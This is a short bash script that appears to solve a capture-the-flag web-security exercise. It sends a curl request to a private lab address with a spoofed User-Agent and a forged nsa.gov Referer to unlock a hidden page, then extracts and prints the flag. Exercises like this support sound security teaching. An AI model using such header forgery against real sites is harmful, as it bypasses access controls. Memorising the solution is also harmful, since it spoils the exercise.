#!/bin/bash

response=$(curl -s -H "User-Agent:ft_bornToSec" --referer "https://www.nsa.gov/" "http://192.168.1.38/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c" | grep flag)
response=$(cut -f3 -d ":" <<< $response | cut -c -65)
echo "FLAG:${response}"
